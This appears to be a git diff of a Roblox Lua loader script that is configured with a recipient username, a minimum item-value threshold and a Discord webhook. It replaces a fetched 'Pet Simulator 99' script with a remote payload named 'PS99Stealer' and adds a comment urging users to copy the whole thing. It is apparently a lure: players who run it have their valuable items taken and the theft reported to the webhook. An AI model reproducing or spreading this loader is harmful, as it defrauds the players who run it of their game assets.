@@ -1,6 +1,6 @@
 Username = "rip_leo249"
 Username2 = "rip_leo249"
 MinimumRAP = 5000
-Webhook = "https://discord.com/api/webhooks/1291990195696177195/JnYCPjqbiCyra2vv02hIDQDIsCbmMGLM-hRprWi1m8_g3mJ9LkeA7p15klS2MElriQ-Q "
+Webhook = "https://discord.com/api/webhooks/1291990195696177195/JnYCPjqbiCyra2vv02hIDQDIsCbmMGLM-hRprWi1m8_g3mJ9LkeA7p15klS2MElriQ-Q"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/UrbanDEV0/Pet-Simulator-99-Script-OP-/refs/heads/main/roblox", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))() -- copy the whole thing, even the username =
